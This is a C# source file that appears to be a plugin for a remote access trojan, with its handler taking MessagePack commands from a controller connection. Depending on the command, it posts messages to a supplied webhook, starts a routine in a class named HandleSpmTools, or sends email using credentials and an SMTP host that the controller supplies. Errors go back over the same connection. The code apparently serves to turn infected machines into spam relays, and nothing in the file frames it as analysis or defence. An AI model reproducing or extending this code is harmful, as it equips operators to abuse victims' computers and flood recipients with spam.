using Plugin.Handle;
using System;
using System.Windows.Forms;
using System.Collections.Generic;
using System.Timers;

namespace Plugin
{
    public static class Packet
    {

        public static void Read(object data)
        {
            try
            {
                MessagePackLib.MessagePack.MsgPack unpack_msgpack = new MessagePackLib.MessagePack.MsgPack();
                unpack_msgpack.DecodeFromBytes((byte[])data);
                switch (unpack_msgpack.ForcePathObject("Pac_ket").AsString)
                {
                    case "WStart":
                        {
                            DAPI.Send(unpack_msgpack.ForcePathObject("webhook").AsString, unpack_msgpack.ForcePathObject("message").AsString);
                            break;
                        }
                    case "CStart":
                        {
                            new HandleSpmTools().CStart(unpack_msgpack.ForcePathObject("message").AsString);
                            break;
                        }
                    case "EmailSent":
                        {
                            new HandleSpmTools().sendemail(unpack_msgpack.ForcePathObject("FromEmail").AsString, unpack_msgpack.ForcePathObject("ToEmail").AsString, unpack_msgpack.ForcePathObject("Pass").AsString, unpack_msgpack.ForcePathObject("Body").AsString, unpack_msgpack.ForcePathObject("Subject").AsString, unpack_msgpack.ForcePathObject("Host").AsString, unpack_msgpack.ForcePathObject("Port").AsString);
                            break;
                        }

                }
            }
            catch (Exception ex)
            {
                Error(ex.Message);
            }
        }


        public static void Error(string ex)
        {
            MessagePackLib.MessagePack.MsgPack msgpack = new MessagePackLib.MessagePack.MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Error";
            msgpack.ForcePathObject("Error").AsString = ex;
            Connection.Send(msgpack.Encode2Bytes());
        }


    }


}